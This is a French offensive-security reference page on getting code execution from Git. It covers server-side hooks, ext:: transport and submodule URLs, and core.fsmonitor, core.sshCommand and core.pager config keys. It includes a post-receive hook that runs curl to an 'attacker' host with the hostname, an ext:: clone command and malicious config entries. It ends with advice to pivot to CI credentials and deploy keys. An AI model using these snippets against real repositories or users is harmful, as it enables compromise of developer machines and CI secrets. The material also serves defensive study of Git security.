---
title: "Hooks et exécution par la config : exécution de code depuis les opérations Git"
description: "Transformer des opérations Git en exécution de code : hooks côté serveur qui s'exécutent au push, le transport ext et des URL de submodule conçues qui exécutent des commandes au clone récursif, et des clés de config de dépôt (core.fsmonitor, core.sshCommand, core.pager) qui s'exécutent quand une victime lance Git dans un dépôt fourni par l'attaquant."
keywords:
  - git hooks
  - ext transport
  - submodule rce
  - core.fsmonitor
  - clone-time code execution
---

# Hooks et exécution par la config

Git exécute des programmes comme partie normale de son fonctionnement : les scripts de hook se déclenchent autour des commits, des push et des merges, et plusieurs clés `config` nomment des commandes externes que Git invoque automatiquement. Chacune d'elles est un chemin d'exécution de code lorsque vous contrôlez soit le côté serveur (où les hooks s'exécutent en tant que compte de service Git), soit le dépôt sur lequel une victime opère (où les hooks et la config s'exécutent en tant que victime).

## Hooks côté serveur au push

Un dépôt bare exécute `hooks/pre-receive`, `update` et `hooks/post-receive` sur le serveur quand un push est accepté, en tant qu'utilisateur exécutant le service Git. Si vous pouvez pousser (un compte authentifié, ou un [démon](git-daemon.md) anonyme avec `receive-pack` activé) et pouvez écrire dans le répertoire des hooks (hébergement mutualisé, un dépôt bare mal configuré, ou une forge qui vous laisse éditer les hooks), un hook est une exécution directe :

```bash
# in a bare repo you can write to
cat > hooks/post-receive <<'H'
#!/bin/sh
id > /tmp/pwned; curl -s https://attacker/x?h=$(hostname)
H
chmod +x hooks/post-receive
# the next accepted push runs it as the Git service account
```

Les hooks côté client (`pre-commit`, `post-checkout`, et ainsi de suite) ne sont délibérément **pas** transférés par un clone, donc un simple `git clone` d'un dépôt hostile ne les exécute pas. Les chemins d'exécution qui atteignent une victime au clone sont ceux du transport et de la config ci-dessous.

## Le transport ext et les URL de submodule

Le transport `ext::` de Git exécute le programme nommé comme moyen d'atteindre un remote, de sorte que cloner une telle URL l'exécute. Git moderne verrouille cela derrière `protocol.ext.allow` (restreint par défaut), et `git-remote-ext` découpe la chaîne après `ext::` en arguments sur les espaces, avec `% ` représentant un espace littéral :

```bash
# protocol.ext.allow must permit it (historical lax default, or set explicitly); % encodes a space
git -c protocol.ext.allow=always clone 'ext::sh -c touch% /tmp/pwned'
```

Le danger est indirect : le `.gitmodules` d'un dépôt peut pointer un submodule vers une URL `ext::` (ou une autre URL porteuse de commande), de sorte qu'une victime exécutant `git clone --recurse-submodules` ou `git submodule update` sur un dépôt hostile exécute la commande. Git restreint désormais les protocoles que les submodules peuvent utiliser (`protocol.ext.allow` bloque cela par défaut dans le contexte submodule), donc cela aboutit sur des clients plus anciens ou là où un administrateur a assoupli `protocol.*.allow`.

## Clés de config qui s'exécutent

Le `.git/config` d'un dépôt nomme plusieurs commandes que Git appelle automatiquement. Si une victime finit par opérer dans un dépôt dont vous contrôlez le `.git/config`, celles-ci s'exécutent en tant que cette victime :

```ini
[core]
    fsmonitor = "sh -c 'id>/tmp/pwned'"    # runs on git status and many commands
    sshCommand = "sh -c 'id>/tmp/pwned'"   # runs when Git makes an SSH connection (fetch/push)
    pager = "sh -c 'id>/tmp/pwned'"        # runs on git log/diff/show
```

Atteindre un `.git/config` contrôlé par l'attaquant est le prérequis. La voie classique est un système de fichiers insensible à la casse ou pliant la casse où un submodule conçu écrit dans le véritable `.git` durant un clone récursif, écrasant `config` ou déposant un script `hooks/` que la même opération déclenche ensuite. Le gain est l'exécution en tant que celui qui lance la prochaine commande Git dans cet arbre, fréquemment un développeur ou un runner CI qui extrait du code non fiable.

## Suite

L'exécution côté serveur aboutit en tant que compte de service Git sur l'hôte du dépôt, pivotez vers d'autres dépôts hébergés et leurs secrets. L'exécution côté client aboutit sur un poste de développeur ou un runner CI ; sur un runner, elle atteint les identifiants du pipeline et les clés de déploiement du build.

## Références

- [gitprotocol / ext transport (git-remote-ext)](https://git-scm.com/docs/git-remote-ext)
- [Git hooks documentation](https://git-scm.com/docs/githooks)
- [Git config: core.fsmonitor, core.sshCommand, core.pager](https://git-scm.com/docs/git-config)
